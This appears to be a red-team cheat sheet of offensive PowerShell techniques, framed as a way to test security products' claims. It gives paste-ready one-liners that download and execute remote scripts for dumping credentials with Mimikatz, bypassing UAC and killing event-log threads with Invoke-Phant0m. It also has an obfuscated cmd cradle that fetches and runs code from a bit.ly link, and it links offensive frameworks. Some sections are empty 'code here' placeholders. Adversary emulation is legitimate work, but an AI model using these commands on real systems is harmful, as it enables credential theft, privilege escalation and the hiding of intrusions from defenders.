

# Powershell

Every product today reports they can prevent fileless, living off the land, nation state :all_the_things: . I say - prove it.

http://www.labofapenetrationtester.com/2015/04/pillage-the-village-powershell-version.html

https://www.blackhillsinfosec.com/?p=5831

## One Liners

### Download Mimikatz and Dump credentials

    powershell.exe "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds"

### Invoke-AppPathBypass

Note: Windows 10 only

Bypass is based on: https://enigma0x3.net/2017/03/14/bypassing-uac-using-app-paths/

    Powershell.exe "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/enigma0x3/Misc-PowerShell-Stuff/master/Invoke-AppPathBypass.ps1'); Invoke-AppPathBypass"

At prompt, to test:

    C:\Windows\System32\cmd.exe

### Obfuscated Powershell

Fancy obfuscation that reaches out to bit.ly/L3g1t to stdout: "SUCCESSFULLY EXECUTED POWERSHELL CODE FROM REMOTE LOCATION"

    cmd /c "set apple=fish (cars help://bit.ly/L3g1t).content&&cmd /c set boat=%apple:fish=iex% ^&^&cmd /c set ab=%boat:cars=iwr% ^^^&^^^&cmd /c echo %ab:el=tt%|%ProgramData:~3,1%%ProgramData:~5,1%we%ProgramData:~7,1%she%Public:~12,1%%Public:~12,1% -"

## Powershell Obfuscation

Provided by @danielbohannon

[Out-FINcodedCommand](https://github.com/danielbohannon/Out-FINcodedCommand/blob/master/README.md)


Setup:

    Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/danielbohannon/Out-FINcodedCommand/master/Out-FINcodedCommand.ps1')

Input:

    Out-FINcodedCommand -command "iex (iwr http://bit.ly/L3g1t).content" -FinalBinary powershell

Follow prompts to create variables.

Output:

    cmd /c "set apple=fish (cars help://bit.ly/L3g1t).content&&cmd /c set boat=%apple:fish=iex% ^&^&cmd /c set ab=%boat:cars=iwr% ^^^&^^^&cmd /c echo %ab:el=tt%|%ProgramData:~3,1%%ProgramData:~5,1%we%ProgramData:~7,1%she%Public:~12,1%%Public:~12,1% -"



[Invoke-CradleCrafter](https://github.com/danielbohannon/Invoke-CradleCrafter)

Input:

    code here

Output:

    code here

[Invoke-Obfuscation](https://github.com/danielbohannon/Invoke-Obfuscation)

Input:

    code here

Output:

    code here

## Powershell Kits

### Unicorn

https://github.com/trustedsec/unicorn/blob/master/README.md

### Empire

http://www.powershellempire.com/

### Bloodhound

https://github.com/BloodHoundAD/BloodHound

### GoFetch

https://github.com/GoFetchAD/GoFetch

### Deathstar

https://github.com/byt3bl33d3r/DeathStar

https://byt3bl33d3r.github.io/automating-the-empire-with-the-death-star-getting-domain-admin-with-a-push-of-a-button.html

### PowerSploit

https://github.com/PowerShellMafia/PowerSploit

### Nishang

https://github.com/samratashok/nishang

### PSAttack

https://github.com/jaredhaight/PSAttack

### Dr0p1t-Framework

https://github.com/D4Vinci/Dr0p1t-Framework

### PowerOPS

https://github.com/fdiskyou/PowerOPS

    powershell.exe Copy ([PSObject].Assembly.Location) C:\

Then:

    csc.exe /unsafe /reference:"C:\System.Management.Automation.dll" /reference:System.IO.Compression.dll /out:C:\users\ieuser\desktop\PowerOPS_x64.exe /platform:x64 "C:\Users\IEUser\Downloads\PowerOPS-1.0-beta\PowerOps\*.cs"

### Invoke-AutoIt

https://github.com/byt3bl33d3r/Invoke-AutoIt

    Powershell.exe "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/byt3bl33d3r/Invoke-AutoIt/master/Invoke-AutoIt.ps1'); Invoke-AutoIt -WindowTitle "Remote Desktop" -Keys "Rainbow Push-ups""

### Invoke-Phant0m

https://github.com/hlldz/Invoke-Phant0m

    Powershell.exe "IEX (New-Object Net.WebClient).DownloadString('https://github.com/hlldz/Invoke-Phant0m/blob/master/Invoke-Phant0m.ps1'); Invoke-Phant0m"

# Other

### DNScat2-powershell

https://github.com/lukebaggett/dnscat2-powershell
